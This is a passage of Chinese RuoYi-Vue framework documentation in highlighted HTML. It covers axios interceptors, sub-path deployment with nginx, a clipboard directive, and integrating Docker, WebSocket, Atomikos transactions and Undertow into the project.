    config<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Authorization'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Bearer '</span> <span class="token operator">+</span> <span class="token function">getToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 让每个请求携带自定义token 请根据实际情况自行修改</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> config
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token parameter">error</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>
    Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// 响应拦截器</span>
service<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>response<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// 未设置状态码则默认成功状态</span>
    <span class="token keyword">const</span> code <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>code <span class="token operator">||</span> <span class="token number">200</span><span class="token punctuation">;</span>
    <span class="token comment">// 获取错误信息</span>
    <span class="token keyword">const</span> msg <span class="token operator">=</span> errorCode<span class="token punctuation">[</span>code<span class="token punctuation">]</span> <span class="token operator">||</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>msg <span class="token operator">||</span> errorCode<span class="token punctuation">[</span><span class="token string">'default'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">===</span> <span class="token number">401</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      MessageBox<span class="token punctuation">.</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">'登录状态已过期，您可以继续留在该页面，或者重新登录'</span><span class="token punctuation">,</span> <span class="token string">'系统提示'</span><span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span>
          confirmButtonText<span class="token operator">:</span> <span class="token string">'重新登录'</span><span class="token punctuation">,</span>
          cancelButtonText<span class="token operator">:</span> <span class="token string">'取消'</span><span class="token punctuation">,</span>
          type<span class="token operator">:</span> <span class="token string">'warning'</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
        store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'LogOut'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
          location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'/index'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">===</span> <span class="token number">500</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      <span class="token function">Message</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
        message<span class="token operator">:</span> msg<span class="token punctuation">,</span>
        type<span class="token operator">:</span> <span class="token string">'error'</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">!==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      Notification<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
        title<span class="token operator">:</span> msg
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span>data
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token parameter">error</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'err'</span> <span class="token operator">+</span> error<span class="token punctuation">)</span>
    <span class="token keyword">let</span> <span class="token punctuation">{<!-- --></span> message <span class="token punctuation">}</span> <span class="token operator">=</span> error<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>message <span class="token operator">==</span> <span class="token string">"Network Error"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      message <span class="token operator">=</span> <span class="token string">"后端接口连接异常"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>message<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"timeout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      message <span class="token operator">=</span> <span class="token string">"系统接口请求超时"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>message<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"Request failed with status code"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      message <span class="token operator">=</span> <span class="token string">"系统接口"</span> <span class="token operator">+</span> message<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"异常"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">Message</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
      message<span class="token operator">:</span> message<span class="token punctuation">,</span>
      type<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>
      duration<span class="token operator">:</span> <span class="token number">5</span> <span class="token operator">*</span> <span class="token number">1000</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">)</span>

<span class="token comment">// 通用下载方法</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> params<span class="token punctuation">,</span> filename</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">return</span> service<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span>
    transformRequest<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token parameter">params</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
      <span class="token keyword">return</span> <span class="token function">tansParams</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    responseType<span class="token operator">:</span> <span class="token string">'blob'</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">const</span> content <span class="token operator">=</span> data
    <span class="token keyword">const</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>content<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'download'</span> <span class="token keyword">in</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      <span class="token keyword">const</span> elink <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
      elink<span class="token punctuation">.</span>download <span class="token operator">=</span> filename
      elink<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'none'</span>
      elink<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span>
      document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>elink<span class="token punctuation">)</span>
      elink<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">revokeObjectURL</span><span class="token punctuation">(</span>elink<span class="token punctuation">.</span>href<span class="token punctuation">)</span>
      document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>elink<span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
      navigator<span class="token punctuation">.</span><span class="token function">msSaveBlob</span><span class="token punctuation">(</span>blob<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">r</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> service
</code></pre>
<p>提示</p>
<p>如果有些不需要传递token的请求，可以设置<code>headers</code>中的属性<code>isToken</code>为<code>false</code></p>
<pre><code class="prism language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> code<span class="token punctuation">,</span> uuid</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">return</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
    url<span class="token operator">:</span> <span class="token string">'xxxx'</span><span class="token punctuation">,</span>
    headers<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
      isToken<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
      <span class="token comment">// 可以自定义 Authorization</span>
	  <span class="token comment">// 'Authorization': 'Basic d2ViOg=='</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    method<span class="token operator">:</span> <span class="token string">'get'</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<h2><a id="14_4832"></a>14、应用路径</h2>
<p>有些特殊情况需要部署到子路径下，例如：<code>https://www.ruoyi.vip/admin</code>，可以按照下面流程修改。</p>
<p>1、修改<code>vue.config.js</code>中的<code>publicPath</code>属性</p>
<pre><code class="prism language-js">publicPath<span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span> <span class="token operator">===</span> <span class="token string">"production"</span> <span class="token operator">?</span> <span class="token string">"/admin/"</span> <span class="token operator">:</span> <span class="token string">"/admin/"</span><span class="token punctuation">,</span>
</code></pre>
<p>2、修改<code>router/index.js</code>，添加一行<code>base</code>属性</p>
<pre><code class="prism language-js"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Router</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
  base<span class="token operator">:</span> <span class="token string">"/admin"</span><span class="token punctuation">,</span>
  mode<span class="token operator">:</span> <span class="token string">'history'</span><span class="token punctuation">,</span> <span class="token comment">// 去掉url中的#</span>
  <span class="token function-variable function">scrollBehavior</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span> y<span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  routes<span class="token operator">:</span> constantRoutes
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>3、<code>/index</code>路由添加获取子路径<code>/admin</code></p>
<p>修改<code>layout/components/Navbar.vue</code>中的<code>location.href</code></p>
<pre><code class="prism language-js">location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'/admin/index'</span><span class="token punctuation">;</span>
</code></pre>
<p>修改<code>utils/request.js</code>中的<code>location.href</code></p>
<pre><code class="prism language-js">location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'/admin/index'</span><span class="token punctuation">;</span>
</code></pre>
<p>4、修改<code>nginx</code>配置</p>
<pre><code class="prism language-text">location /admin {
	alias   /home/ruoyi/projects/ruoyi-ui;
	try_files $uri $uri/ /admin/index.html;
	index  index.html index.htm;
}
</code></pre>
<p>打开浏览器，输入：<code>https://www.ruoyi.vip/admin</code> 能正常访问和刷新表示成功。</p>
<h2><a id="15_4879"></a>15、内容复制</h2>
<p>如果要使用复制功能可以使用指令<code>v-clipboard</code>，示例代码。</p>
<pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-button</span>
  <span class="token attr-name"><span class="token namespace">v-clipboard:</span>copy</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span>
  <span class="token attr-name"><span class="token namespace">v-clipboard:</span>success</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>copySuccess<span class="token punctuation">"</span></span>
  <span class="token attr-name"><span class="token namespace">v-clipboard:</span>error</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>copyFailed<span class="token punctuation">"</span></span>
<span class="token punctuation">&gt;</span></span>复制<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-button</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>v-clipboard:copy</td><td>需要复制的内容</td></tr><tr><td>v-clipboard:cat</td><td>需要剪贴的内容</td></tr><tr><td>v-clipboard:success</td><td>复制成功处理函数</td></tr><tr><td>clipboard:error</td><td>复制失败处理函数</td></tr></tbody></table>
<h1><a id="_4900"></a>二十三、插件集成</h1>
<p>为了让开发者更加方便和快速的满足需求，提供了各种插件集成实现方案。</p>
<h2><a id="1docker_4904"></a>1、集成docker实现一键部署</h2>
<p><code>Docker</code>是一个虚拟环境容器，可以将你的开发环境、代码、配置文件等一并打包到这个容器中，最终只需要一个命令即可打包发布应用到任意平台中。</p>
<p>1、安装docker</p>
<pre><code class="prism language-sh">yum install https://download.docker.com/linux/fedora/30/x86_64/stable/Packages/containerd.io-1.2.6-3.3.fc30.x86_64.rpm
yum install -y yum-utils device-mapper-persistent-data lvm2
yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
yum install -y docker-ce
curl -L "https://github.com/docker/compose/releases/download/1.25.0/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
</code></pre>
<p>2、检查<code>docker</code>和<code>docker-compose</code>是否安装成功</p>
<pre><code class="prism language-sh">docker version
docker-compose --version
</code></pre>
<p>3、文件授权</p>
<pre><code class="prism language-sh">chmod +x /usr/local/bin/docker-compose
</code></pre>
<p>4、下载若依docker插件，上传到自己的服务器目录</p>
<p>插件相关脚本实现<code>ruoyi-vue/集成docker实现一键部署.zip</code></p>
<p>链接: https://pan.baidu.com/s/13JVC9jm-Dp9PfHdDDylLCQ 提取码: y9jt</p>
<ul><li>其中<code>db目录</code>存放<code>ruoyi数据库脚本</code></li><li>其中<code>jar目录</code>存放打包好的<code>jar应用文件</code></li><li>其中<code>conf目录</code>存放<code>redis.conf</code>和<code>nginx.conf</code>配置</li><li>其中<code>html\dist目录</code>存放打包好的静态页面文件</li><li>数据库<code>mysql</code>地址需要修改成<code>ruoyi-mysql</code></li><li>缓存<code>redis</code>地址需要修改成<code>ruoyi-redis</code></li><li>数据库脚本头部需要添加<code>SET NAMES 'utf8';</code>（防止乱码）</li></ul>
<p>5、启动docker</p>
<pre><code class="prism language-sh">systemctl start docker
</code></pre>
<p>6、构建docker服务</p>
<pre><code class="prism language-sh">docker-compose build
</code></pre>
<p>7、启动docker容器</p>
<pre><code class="prism language-sh">docker-compose up -d
</code></pre>
<p>8、访问应用地址</p>
<p>打开浏览器，输入：(<a href="http://localhost/">http://localhost:80 (opens new window)</a>)，若能正确展示页面，则表明环境搭建成功。</p>
<p>提示</p>
<p>启动服务的容器<code>docker-compose up ruoyi-mysql ruoyi-server ruoyi-nginx ruoyi-redis</code></p>
<p>停止服务的容器<code>docker-compose stop ruoyi-mysql ruoyi-server ruoyi-nginx ruoyi-redis</code></p>
<h2><a id="2websocket_4983"></a>2、成websocket实现实时通信</h2>
<p><code>WebSocket</code>是一种通信协议，可在单个<code>TCP</code>连接上进行全双工通信。<code>WebSocket</code>使得客户端和服务器之间的数据交换变得更加简单，允许服务端主动向客户端推送数据。在<code>WebSocket API</code>中，浏览器和服务器只需要完成一次握手，两者之间就可以建立持久性的连接，并进行双向数据传输。</p>
<p>1、<code>ruoyi-framework/pom.xml</code>文件添加<code>websocket</code>依赖。</p>
<pre><code class="prism language-xml"><span class="token comment">&lt;!-- SpringBoot Websocket --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-websocket<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>2、配置匿名访问（可选）</p>
<pre><code class="prism language-java"><span class="token comment">// 如果需要不登录也可以访问，需要在`SecurityConfig.java`中设置匿名访问</span>
<span class="token punctuation">(</span><span class="token string">"/websocket/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>3、下载插件相关包和代码实现覆盖到工程中</p>
<p>提示</p>
<p>插件相关包和代码实现<code>ruoyi-vue/集成websocket实现实时通信.zip</code></p>
<p>链接: https://pan.baidu.com/s/13JVC9jm-Dp9PfHdDDylLCQ 提取码: y9jt</p>
<p>4、测试验证</p>
<p>如果要测试验证可以把<code>websocket.vue</code>内容复制到<code>login.vue</code>，点击连接发送消息测试返回结果。</p>
<h2><a id="3atomikos_5020"></a>3、集成atomikos实现分布式事务</h2>
<p>在一些复杂的应用开发中，一个应用可能会涉及到连接多个数据源，所谓多数据源这里就定义为至少连接两个及以上的数据库了。 对于这种多数据的应用中，数据源就是一种典型的分布式场景，因此系统在多个数据源间的数据操作必须做好事务控制。在<code>SpringBoot</code>的官网推荐我们使用<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/boot-features-jta.html">Atomikos (opens new window)</a>。 当然分布式事务的作用并不仅仅应用于多数据源。例如：在做数据插入的时候往一个<code>kafka</code>消息队列写消息，如果信息很重要同样需要保证分布式数据的一致性。</p>
<p><strong>若依框架已经通过<code>Druid</code>实现了多数据源切换，但是<code>Spring</code>开启事务后会维护一个ConnectionHolder，保证在整个事务下，都是用同一个数据库连接。所以我们需要<code>Atomikos</code>解决多数据源事务的一致性问题</strong></p>
<p>1、<code>ruoyi-framework/pom.xml</code>文件添加<code>atomikos</code>依赖。</p>
<pre><code class="prism language-xml"><span class="token comment">&lt;!-- atomikos分布式事务 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-jta-atomikos<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>2、下载插件相关包和代码实现覆盖到工程中</p>
<p>提示</p>
<p>插件相关包和代码实现<code>ruoyi/集成atomikos实现分布式事务.zip</code></p>
<p>链接: https://pan.baidu.com/s/13JVC9jm-Dp9PfHdDDylLCQ 提取码: y9jt</p>
<p>3、测试验证</p>
<p>加入多数据源，如果不会使用可以<a href="http://doc.ruoyi.vip/ruoyi/document/htsc.html#%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90">参考多数据源实现</a>。</p>
<p>对应需要操作多数据源方法加入<code>@Transactional</code>测试一致性，例如。</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Transactional</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token class-name">SpringUtils</span><span class="token punctuation">.</span><span class="token function">getAopProxy</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">SpringUtils</span><span class="token punctuation">.</span><span class="token function">getAopProxy</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token annotation punctuation">@DataSource</span><span class="token punctuation">(</span><span class="token class-name">DataSourceType</span><span class="token punctuation">.</span>MASTER<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insertA</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> xxxxMapper<span class="token punctuation">.</span><span class="token function">insertXxxx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token annotation punctuation">@DataSource</span><span class="token punctuation">(</span><span class="token class-name">DataSourceType</span><span class="token punctuation">.</span>SLAVE<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insertB</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> xxxxMapper<span class="token punctuation">.</span><span class="token function">insertXxxx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>到此我们项目多个数据源的事务控制生效了</strong></p>
<h2><a id="4undertowtomcat_5075"></a>4、使用undertow来替代tomcat容器</h2>
<p><code>SpingBoot</code>中我们既可以使用<code>Tomcat</code>作为<code>Http</code>服务，也可以用<code>Undertow</code>来代替。<code>Undertow</code>在高并发业务场景中，性能优于<code>Tomcat</code>。所以，如果我们的系统是高并发请求，不妨使用一下<code>Undertow</code>，你会发现你的系统性能会得到很大的提升。</p>
<p>1、<code>ruoyi-framework\pom.xml</code>模块修改web容器依赖，使用undertow来替代tomcat容器</p>
<pre><code class="prism language-xml"> <span class="token comment">&lt;!-- SpringBoot Web容器 --&gt;</span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">&gt;</span></span>
		 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
			 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
			 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
		 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
	 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- web 容器使用 undertow --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-undertow<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>2、修改<code>application.yml</code>，使用undertow来替代tomcat容器</p>
<pre><code class="prism language-yml"><span class="token comment"># 开发环境配置</span>
<span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token comment"># 服务器的HTTP端口，默认为80</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">80</span>
  <span class="token key atrule">servlet</span><span class="token punctuation">:</span>
    <span class="token comment"># 应用的访问路径</span>
    <span class="token key atrule">context-path</span><span class="token punctuation">:</span> /
  <span class="token comment"># undertow 配置</span>
  <span class="token key atrule">undertow</span><span class="token punctuation">:</span>
    <span class="token comment"># HTTP post内容的最大大小。当值为-1时，默认值为大小是无限的</span>
    <span class="token key atrule">max-http-post-size</span><span class="token punctuation">:</span> <span class="token number">-1</span>
    <span class="token comment"># 以下的配置会影响buffer,这些buffer会用于服务器连接的IO操作,有点类似netty的池化内存管理</span>
    <span class="token comment"># 每块buffer的空间大小,越小的空间被利用越充分</span>
    <span class="token key atrule">buffer-size</span><span class="token punctuation">:</span> <span class="token number">512</span>
    <span class="token comment"># 设置IO线程数, 它主要执行非阻塞的任务,它们会负责多个连接, 默认设置每个CPU核心一个线程</span>
    <span class="token key atrule">io-threads</span><span class="token punctuation">:</span> <span class="token number">8</span>
    <span class="token comment"># 阻塞任务线程池, 当执行类似servlet请求阻塞操作, undertow会从这个线程池中取得线程,它的值设置取决于系统的负载</span>
    <span class="token key atrule">worker-threads</span><span class="token punctuation">:</span> <span class="token number">256</span>
    <span class="token comment"># 是否分配的直接内存</span>
    <span class="token key atrule">direct-buffers</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
</code></pre>
<p>3、修改文件上传工具类<code>FileUploadUtils.java</code></p>
